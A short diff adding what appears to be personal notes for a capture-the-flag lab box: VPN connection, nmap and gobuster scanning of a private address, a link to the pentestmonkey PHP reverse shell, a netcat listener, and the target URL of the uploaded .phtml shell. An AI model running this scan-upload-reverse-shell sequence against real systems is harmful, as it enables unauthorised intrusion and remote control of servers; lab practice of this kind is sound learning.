@@ -1,0 +1,23 @@
+sudo openvpn omerta.depi.ovpn
+
+
+
+ping 10.10.142.244
+
+
+nmap -sS 10.10.142.244
+
+
+nmap -sS -A  10.10.142.244
+
+
+gobuster dir -u http://10.80.157.130:3333/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ifconfig # to use out tun0 ip 
+
+
+# revrse shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+
+nc -lvnp 1234
+
+http://10.10.142.244:3333/internal/uploads/php-reverse-shell.phtml
